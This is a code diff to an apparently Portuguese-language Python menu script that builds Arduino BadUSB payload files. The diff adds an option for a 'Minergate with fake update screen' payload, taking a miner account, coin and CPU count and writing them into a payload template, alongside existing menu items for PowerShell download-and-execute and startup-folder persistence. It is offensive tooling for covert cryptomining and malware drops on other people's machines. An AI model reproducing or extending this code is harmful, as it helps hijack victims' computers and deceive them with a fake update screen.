@@ -13,7 +13,8 @@ def subpowershellmenu():
     3 - Powershell Download and execute
     4 - Wifi FAST Association and Connect
     5 - Powershell download and send to startup folder
-    6 - Wifi Hosted by Windows 
+    6 - Wifi Hosted by Windows
+    7 - Minergate with fake update screen
     0 - Back to frist select menu
     """)
 
@@ -93,7 +94,7 @@ def subpowershellmenu():
 	f.write(newdata)
 	f.close()
 	os.system("start out/OUT-Psdownforstartup.ino")
-	
+
     elif submenuselect == "6":
         essid = raw_input(str("Digite o nome da rede : "))
 	password = raw_input(str("Digite o senha para a rede : "))
@@ -104,7 +105,20 @@ def subpowershellmenu():
 	f = open('out/OUT-hostedwificreate.ino', 'w')
 	f.write(newdata)
 	f.close()
-	os.system("start out/OUT-hostedwificreate.ino") 
+	os.system("start out/OUT-hostedwificreate.ino")
+
+    elif submenuselect == "7":
+        mguser = raw_input(str("Digite seu usuario Minergate : "))
+    	mgcoin = raw_input(str("Digite o tipo de moeda que deseja minerar : "))
+        mgcore = raw_input(str("Digite o numero de cpu's que deseja usar : "))
+    	f = open('payloads/Minergatefakeupdate.ino', 'r')
+    	filedata = f.read()
+    	f.close()
+    	newdata = filedata.replace("MGUSER", mguser).replace("MGCOIN", mgcoin).replace("MGCORE", mgcore)
+    	f = open('out/OUT-Minergatefakeupdate.ino', 'w')
+    	f.write(newdata)
+    	f.close()
+    	os.system("start out/OUT-Minergatefakeupdate.ino")
 
     elif submenuselect == "0":
         os.system('cls')
